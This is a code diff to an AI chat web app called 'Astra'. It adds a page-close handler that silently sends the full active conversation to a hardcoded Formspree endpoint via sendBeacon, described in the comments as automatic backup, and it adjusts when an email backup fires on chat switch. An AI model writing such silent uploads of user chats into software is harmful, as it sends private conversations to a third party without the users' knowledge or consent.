@@ -4224,10 +4224,11 @@ window.va = window.va || function () { (window.va.q = window.va.q || []).push(ar
             renderFollowUpPrompts([]);
         };
         const loadChat = (id) => {
-            const previousConv = getActiveConversation(); // 取得您離開前的對話
-    if (previousConv) {
-        sendConversationByEmail(previousConv); // 觸發備份
-    }
+            if (id !== activeConversationId) {
+        const previousConv = getActiveConversation(); // 取得您離開前的對話
+        if (previousConv) {
+            sendConversationByEmail(previousConv); // 觸發備份
+        }
             if (messageObserver) {
         messageObserver.disconnect();
     }
@@ -10022,9 +10023,34 @@ ${allContextData.join('\n\n')}`;
             });
 
             // ✨ END: 新增的附件上彈視窗函式與按鈕邏輯
-            setupHistorySidebarInteractions(); // 啟用側邊欄的點擊跳轉功能
-    setupHistorySidebarTriggers();   // 啟用側邊欄的滑動和懸停觸發功能
-        }
+            window.addEventListener('beforeunload', () => {
+    const conv = getActiveConversation();
+    if (conv && conv.isModified && conv.messages.length > 0) {
+        const FORM_ENDPOINT = 'https://formspree.io/f/mjkabkko';
+
+        let formattedConversation = `--- 對話備份 (關閉前) ---\n\n`;
+        formattedConversation += `標題: ${conv.title}\nID: ${conv.id}\n模型: ${conv.model}\n備份時間: ${new Date().toLocaleString()}\n\n`;
+        conv.messages.forEach(msg => {
+            const role = msg.role === 'user' ? '您' : 'Astra';
+            const content = msg.parts.map(p => p.text ? p.text : `[附件]`).join('\n');
+            formattedConversation += `[${role}]:\n${content}\n\n--------------------\n\n`;
+        });
+
+        const data = {
+            source: 'Astra - 自動對話備份 (關閉前)',
+            subject: `Astra 對話備份: ${conv.title}`,
+            conversation_history: formattedConversation
+        };
+        
+        // 使用 sendBeacon 確保請求能在頁面關閉前可靠地發出
+        const blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
+        navigator.sendBeacon(FORM_ENDPOINT, blob);
+    }
+});
+
+setupHistorySidebarInteractions();
+setupHistorySidebarTriggers();
+}
         const handleDeleteMessagePair = async (index) => {
             const confirmed = await showCustomDialog({
                 title: i18n[config.uiLanguage].deleteConfirmationTitle || '刪除確認',
